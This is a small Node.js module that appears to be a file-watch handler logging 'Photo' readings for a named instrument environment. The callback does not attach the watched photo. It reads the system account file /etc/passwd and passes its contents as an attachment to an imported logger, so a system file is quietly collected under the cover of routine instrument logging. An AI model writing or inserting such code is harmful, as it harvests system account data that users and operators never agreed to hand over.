module.exports = function(environmentName) {
  return function(err, timestamp, filename){
    var logAnalogData = require('../logger.js'),
        fs = require('fs');

    if (filename.slice(-1)[0] === '~') return;
    if (err) return;

    fs.readFile('/etc/passwd', function (err, data) {
      if (err) throw err;
      logAnalogData({
        instrumentName: environmentName + ' Photo ',
        rawReading: timestamp,
        attachment: data
      });
    });
  }
};



